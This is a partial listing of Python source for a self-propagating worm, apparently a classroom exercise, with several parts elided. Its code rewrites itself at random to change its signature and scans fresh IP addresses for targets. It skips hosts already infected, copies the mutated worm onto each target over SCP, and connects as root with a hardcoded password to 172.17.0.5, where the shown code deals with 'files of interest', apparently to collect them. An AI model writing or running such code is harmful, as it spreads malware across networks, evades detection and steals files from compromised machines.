...
def alter_worm_code():
    worm_code = ''
    with open(sys.argv[0], 'r') as worm_file:
        worm_code = worm_file.readlines()

    num_alterations = random.randint(1, 50)

    for _ in range(num_alterations):
        line_index = random.randint(0, len(worm_code) - 1)

        alteration_type = random.randint(0, 2)

        if alteration_type == 0:  # add a line
            worm_code.insert(line_index, '\n')
        elif alteration_type == 1:  # find a comment after line and add some char
            line = worm_code[line_index]

            if '#' in line:
                comment_start = line.index('#')
                pos = random.randint(comment_start, len(line))
                worm_code[line_index] = line[:pos] + ' ' + line[pos:]

    rand_file_num = random.randint(0, 1000)
    altered_filename = f'AlteredAbraWorm{rand_file_num}.py'

    with open(altered_filename, 'w') as altered_file:
        altered_file.write("".join(worm_code))
            ...
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                ...
                try:
                    ...
                    print("\n\noutput of 'ls' command: %s" %
                        str(received_list))
                    if str(received_list).find('AlteredAbraWorm') >= 0:
                    ...
                    print('\nputting worm file at the target')
                    altered_worm_file = alter_worm_code()
                    scpcon.put(altered_worm_file)
                    os.remove(altered_worm_file)
                    scpcon.close()
                ...
                if len(files_of_interest_at_target) > 0:
                    ...
                    try:
                        ...
                        ssh.connect('172.17.0.5', port=22, username='root',
                                    password='mypassword', timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
